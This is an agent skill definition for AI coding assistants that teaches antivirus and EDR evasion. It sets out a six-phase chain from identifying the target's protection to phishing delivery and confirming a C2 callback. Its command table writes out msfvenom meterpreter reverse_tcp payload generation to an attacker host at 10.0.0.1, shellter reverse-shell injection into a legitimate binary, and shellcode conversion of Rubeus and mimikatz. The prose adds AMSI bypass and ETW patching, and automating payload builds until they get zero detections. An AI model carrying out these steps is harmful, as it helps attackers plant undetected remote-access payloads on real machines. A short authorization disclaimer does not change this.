---
name: av-edr-evasion
description: "AV/EDR evasion covers techniques for bypassing antivirus (AV) and Endpoint Detection/Response (EDR) solutions during payload delivery, execution, and post-exploitation."
origin: openclaw
version: "0.1.18"
compatibility:
  - openclaw
  - claude-code
  - cursor
  - windsurf
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - WebSearch
  - WebFetch
metadata:
  domain: exploitation
  tool_count: 7
  guide_count: 5
  mitre: "TA0005-Defense Evasion"
---




# Skill: AV/EDR Evasion

> **Supplementary Files**:
> - `payloads.md` -- AV/EDR evasion payload collection: payload generation with msfvenom, PE injection with shellter, framework evasion with veil, .NET shellcode with donut, PE-to-shellcode conversion with pe2shc, encryption with hyperion, custom crypter techniques
> - `test-cases.md` -- 6 structured test cases covering shellter PE injection, veil payload generation, msfvenom multi-encoder chains, donut .NET assembly conversion, pe2shc PE-to-shellcode conversion, and hyperion encryption

## Summary

Av Edr Evasion skill domain covering exploitation operations.

**Tools**: shellter, veil, msfvenom, donut, pe2shc, hyperion, crypter

**Domain**: exploitation

**MITRE ATT&CK**: TA0005-Defense Evasion

## Description

AV/EDR evasion covers techniques for bypassing antivirus (AV) and Endpoint Detection/Response (EDR) solutions during payload delivery, execution, and post-exploitation. This skill focuses on defeating static analysis (signature-based detection), dynamic analysis (behavioral monitoring), and heuristic detection used by commercial security products such as Windows Defender, CrowdStrike Falcon, SentinelOne, Carbon Black, and similar platforms.

The core principle is understanding how detection engines work so that payloads can be modified to avoid triggering their rules. Static detection relies on file hashes, byte patterns, and YARA signatures. Dynamic detection monitors API calls, process trees, network connections, and registry modifications. EDR platforms aggregate telemetry from ETW (Event Tracing for Windows), kernel callbacks, and memory scanning to build a behavioral profile of running code.

**Key Evasion Surfaces**:

- **Static Analysis Bypass**: Encoding, encryption, and obfuscation to defeat signature matching and YARA rules
- **Behavioral Evasion**: Direct syscalls, API unhooking, and living-off-the-land binaries to avoid behavioral detection
- **In-Memory Execution**: Reflective loading, process injection, and shellcode runners that avoid disk-based detection
- **AMSI Bypass**: Defeating the Anti-Malware Scan Interface used by Windows Defender and PowerShell
- **ETW Patching**: Disabling Event Tracing for Windows to blind EDR telemetry collection

---

## Use Cases

1. **Payload Delivery in Monitored Environments** -- Generate payloads that bypass endpoint protection during initial access and delivery phases
2. **Post-Exploitation Tool Execution** -- Execute tools and frameworks on endpoints where AV/EDR would normally flag offensive tooling
3. **Red Team Engagement Delivery** -- Prepare and test phishing attachments,droppers, and loaders that must evade enterprise EDR
4. **C2 Agent Deployment** -- Deploy command-and-control agents that survive behavioral monitoring and periodic scans
5. **Lateral Movement Tool Transfer** -- Move tools between hosts without triggering file-transfer or execution alerts

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **shellter** | PE file infection with shellcode injection (preserves original functionality) | `shellter --file legit.exe --payload reverse_tcp --lhost 10.0.0.1 --lport 4444` |
| **veil** | Evasion framework generating obfuscated payloads in multiple languages | `veil -t Evasion -p 1 --msfvenom --list` |
| **msfvenom** | Metasploit payload generator with encoding and format options | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe` |
| **donut** | Generate x86/x64 shellcode from .NET assemblies, VBScript, and PE files | `donut -i Rubeus.exe -p "kerberoast" -o rubeus.bin` |
| **pe2shc** | Convert PE executables to position-independent shellcode | `pe2shc mimikatz.exe mimikatz.bin` |
| **hyperion** | Encrypt PE files with AES-128 to bypass static detection | `hyperion payload.exe encrypted.exe` |
| **crypter** | Custom payload encryption wrapper for evading signature detection | Varies by implementation |

---

## Methodology

### Attack Chain

```
[1] Assess               [2] Prepare              [3] Obfuscate
  - Identify AV/EDR        - Generate base           - Encode with msfvenom
  - Detection capabilities   payload (msfvenom/       encoders (multi-iteration)
  - Test baseline            custom shellcode)       - Encrypt with hyperion
  - Sandbox fingerprint    - Choose payload type     - Inject with shellter
       |                        |                    - Obfuscate with veil
       v                        v                        |
[4] Convert              [5] Test                 [6] Deliver
  - PE to shellcode         - Test against local     - Deploy via approved
    (pe2shc)                  AV (Windows Defender)   delivery mechanism
  - .NET assembly to       - Submit to sandbox        - Execute via LOLBin
    shellcode (donut)        (any.run, hybrid           - Verify C2 callback
  - Reflective loading       analysis)
```

**Phase Details**:

1. **Assess** -- Identify the target AV/EDR product and version, understand its detection capabilities (signature, heuristic, behavioral), and test baseline detection rates. Fingerprinting the endpoint protection determines which evasion techniques are most likely to succeed.
2. **Prepare** -- Generate a base payload using msfvenom, custom shellcode, or a post-exploitation tool. Choose the appropriate payload type (staged vs. stageless, x86 vs. x64) and output format based on the delivery vector.
3. **Obfuscate** -- Apply encoding chains (shikata_ga_nai, xor), encryption (hyperion AES-128), PE injection (shellter), or framework-level evasion (veil) to defeat static analysis. Layering multiple techniques increases evasion success.
4. **Convert** -- Transform payloads into formats that bypass specific detection layers: PE-to-shellcode conversion with pe2shc, .NET assembly shellcode generation with donut, or reflective DLL injection for in-memory execution.
5. **Test** -- Verify evasion effectiveness against the target AV/EDR product. Use local testing (Windows Defender on a test VM) and sandbox submission (any.run, hybrid analysis) to confirm detection rates before deployment.
6. **Deliver** -- Deploy the evaded payload via the approved delivery mechanism (phishing attachment, web download, LOLBin execution, or lateral movement tool transfer). Verify successful execution and C2 callback.

### Defense Perspective

| Defense Measure | Description | Evasion Techniques Countered |
|-----------------|-------------|-----------------------------|
| Signature-based detection | YARA rules, hash matching, byte-pattern scanning | Encoding chains, encryption, custom crypters |
| Heuristic analysis | Emulation, entropy checks, suspicious API detection | PE injection, legitimate binary abuse |
| Behavioral monitoring | Process tree analysis, API call tracing, ETW telemetry | Direct syscalls, API unhooking, LOLBins |
| AMSI (Anti-Malware Scan Interface) | Script content scanning before execution | AMSI bypass via memory patching |
| Memory scanning | Periodic scanning of process memory for injected code | Sleep obfuscation, encryption-at-rest in memory |
| Kernel callbacks | Kernel-level monitoring of process/thread/image load events | DKOM, driver manipulation |

---

## Practical Steps

### 1. Target AV/EDR Identification

Before crafting payloads, identify what protection is running on the target endpoint. Use OSINT, phishing telemetry, or network reconnaissance to determine the AV/EDR product and version.

### 2. Base Payload Generation

Use msfvenom to generate the initial payload with appropriate architecture, format, and connection parameters.

### 3. Encoding and Encryption

Apply msfvenom encoding chains (multiple iterations of shikata_ga_nai), hyperion AES encryption, or shellter PE injection to defeat static detection signatures.

### 4. Format Conversion

Convert payloads into delivery-appropriate formats: pe2shc for PE-to-shellcode, donut for .NET assemblies, or custom loaders for in-memory execution.

### 5. Evasion Testing

Test the final payload against the target AV/EDR and public sandboxes before deployment. Iterate on evasion techniques if detection occurs.

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

---

## Common Pitfalls

- **Relying on a single evasion layer**: Encoding alone (e.g., shikata_ga_nai) no longer bypasses modern AV. Layer encoding, encryption, and injection techniques together. A payload that passes static analysis may still trigger behavioral detection when it executes.
- **Testing only against Windows Defender**: Enterprise environments run commercial EDR products (CrowdStrike, SentinelOne, Carbon Black) that use kernel-level telemetry, not just signature matching. A payload that evades Defender may be immediately caught by EDR behavioral rules.
- **Ignoring staging vs. stageless trade-offs**: Staged payloads (meterpreter/reverse_tcp) download a second stage over the network, which EDR can intercept. Stageless payloads are larger and more likely to trigger static detection but avoid network-based detection. Choose based on the target's detection capabilities.

## Automation and Scripting

Automate payload generation and testing by scripting msfvenom with encoding chains and piping the output directly into hyperion for encryption, then submitting the result to an AV testing API for automated detection scoring. Build a shell script that iterates through veil evasion modules and records which payloads achieve zero detections. Use pe2shc and donut in CI/CD pipelines to automatically convert post-exploitation tools into shellcode formats as part of red team infrastructure setup. Script AMSI bypass testing by launching PowerShell with different bypass techniques and measuring which ones allow known-malicious script content to execute without triggering Defender.

## Reporting and Documentation

AV/EDR evasion findings should document the specific protection product and version tested, which evasion techniques succeeded and failed, detection scores from public sandboxes, and the complete build chain used to generate the evaded payload. Include the exact msfvenom command, encoding iterations, encryption parameters, and any custom modifications. Report which behavioral detections fired (and which were bypassed) to help defenders understand coverage gaps. Map evasion failures to specific detection rules (signature ID, YARA rule name, or behavioral policy) when possible.

## Legal and Ethical Considerations

AV/EDR evasion techniques must only be used within authorized penetration testing or red team engagements with explicit written permission. Submitting payloads to public sandboxes (VirusTotal, Hybrid Analysis) may share samples with AV vendors, causing detection signatures to be created for your payloads. Use malware scanning services with "no-distribution" policies (e.g., masturbator, virusbay) or local test VMs for payload testing during engagements. Never use evasion techniques to deploy actual malware, ransomware, or unauthorized access tools.

## Integration with Other Tools

AV/EDR evasion techniques integrate directly with several adjacent skills. Payload generation with msfvenom connects to post-exploitation for meterpreter sessions and lateral movement. Shellcode injection with donut and pe2shc supports executing tools from other domains (mimikatz from password-attack, nmap from network-pentest) on monitored endpoints. AMSI bypass enables PowerShell-based web-auth-bypass and social-engineering attack chains on hardened endpoints. Process injection techniques overlap with binary-reverse for understanding PE structures and code signing.

## Case Studies and Examples

- **Shellter injection into legitimate tool**: A red team injected shellcode into a legitimate signed utility (Sysinternals tool) using shellter's automatic mode. The resulting binary passed Windows Defender and CrowdStrike static analysis because the original digital signature structure was preserved and the injected shellcode was encrypted within the PE sections.
- **Multi-layer encoding bypass**: A penetration tester used msfvenom with 10 iterations of shikata_ga_nai followed by hyperion AES encryption to generate a payload that achieved zero detections on VirusTotal. The key was combining two different evasion techniques (encoding and encryption) rather than relying on either one alone.
- **Donut for .NET tool execution**: During an engagement, the Rubeus.exe Kerberos attack tool was converted to shellcode using donut and loaded via a custom reflective loader. This bypassed endpoint protection that was specifically looking for Rubeus.exe file hashes and PowerShell invocation patterns.

## Detection and Evasion

Defenders detect evasion attempts through multiple indicators: high entropy in PE sections (suggesting encryption or packing), injection-related API calls (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread), anomalous parent-child process relationships, reflective DLL loading patterns, and AMSI bypass attempts in PowerShell command-line logging. To maximize evasion: combine encoding with encryption, use legitimate binaries as hosts (shellter), execute in memory rather than writing to disk, leverage LOLBins for execution, and patch ETW providers to blind EDR telemetry. Sleep obfuscation techniques (encrypting memory while sleeping) help evade periodic memory scans.

## Advanced Techniques

Advanced AV/EDR evasion includes: direct syscall invocation (bypassing ntdll hooks by resolving syscall numbers dynamically), API unhooking (restoring original ntdll bytes from a clean copy on disk), hardware breakpoint injection (using Vectored Exception Handling instead of hooks), process doppelganging (using NTFS transactions to run modified executables without touching disk), and sleep obfuscation (encrypting in-memory payloads between callback intervals). For .NET payloads, AMSI bypass via memory patching (zeroing the AMSI initialize function) combined with assembly loading from byte arrays avoids file-based detection entirely.

## Tool Comparison Matrix

| Tool | Best For | Speed | Evasion Quality | Skill Level |
|------|----------|-------|-----------------|-------------|
| **shellter** | PE injection into legitimate binaries | Moderate | High (preserves signatures) | Beginner |
| **veil** | Framework-level payload generation | Fast | Moderate | Beginner |
| **msfvenom** | Base payload + encoding chains | Fast | Moderate (encoding alone) | Beginner |
| **donut** | .NET assembly to shellcode conversion | Fast | High (in-memory execution) | Intermediate |
| **pe2shc** | PE to position-independent shellcode | Fast | High (enables loaders) | Intermediate |
| **hyperion** | AES encryption of PE files | Moderate | Moderate-High | Beginner |

## Performance and Remediation

Payload generation with msfvenom encoding chains is fast (seconds for most payloads), but higher iteration counts (i > 10) produce diminishing returns as modern AV uses entropy-based detection. Hyperion encryption adds approximately 50KB overhead to PE files. Donut shellcode generation from large .NET assemblies (e.g., Rubeus, Seatbelt) produces shellcode binaries of 500KB-2MB, which may trigger size-based heuristics. Prioritize evasion by defense layer: first defeat static analysis (encoding/encryption), then address behavioral detection (in-memory execution, direct syscalls), and finally handle memory scanning (sleep obfuscation). For defenders: layer signature-based, heuristic, behavioral, and memory-scanning detection; do not rely solely on any single detection method.

## Hacker Laws

1. **Know Your Enemy** -- Effective evasion requires understanding how the target detection engine works. Study the AV/EDR architecture (user-mode hooks, kernel callbacks, ETW providers) before choosing evasion techniques. Blindly applying encoding rarely works against modern EDR.
2. **Defense in Depth Applies to Attackers Too** -- Layer multiple evasion techniques (encoding + encryption + injection + behavioral evasion) rather than relying on a single method. Each layer addresses a different detection mechanism.
3. **Living Off the Land** -- The most reliable evasion uses tools and binaries already present on the target system (PowerShell, certutil, mshta, wscript). Legitimate system tools are inherently trusted and rarely flagged by behavioral rules.

---

## Learning Resources

  **This skill's supplementary files**: payloads.md, test-cases.md
  **Related skills**: skills/post-exploitation/SKILL.md, skills/binary-reverse/SKILL.md, skills/password-attack/SKILL.md
  **External resources**:
  - **Workspace internal materials**: `guides/payload-obfuscation-av-bypass-guide.md` -- Shellter, veil, and msfvenom encoder strategies for static analysis bypass; `guides/in-memory-execution-dotnet-guide.md` -- Donut, pe2shc, reflective loading, and AMSI bypass; `guides/edr-detection-evasion-guide.md` -- Direct syscalls, API unhooking, ETW patching, and LOLBin strategies
  - **Shellter Official**: https://www.shellterproject.com/ -- PE injection tool documentation
  - **Veil Framework**: https://github.com/Veil-Framework/Veil -- Evasion framework
  - **Donut GitHub**: https://github.com/TheWover/donut -- .NET assembly shellcode generator
  - **HackTricks - Evasion**: https://book.hacktricks.xyz/windows-hardening/av-bypass -- AV/EDR evasion reference
  - **REDTEAM OpSec**: https://redteam.guide/docs/ -- Operational security for red team operations
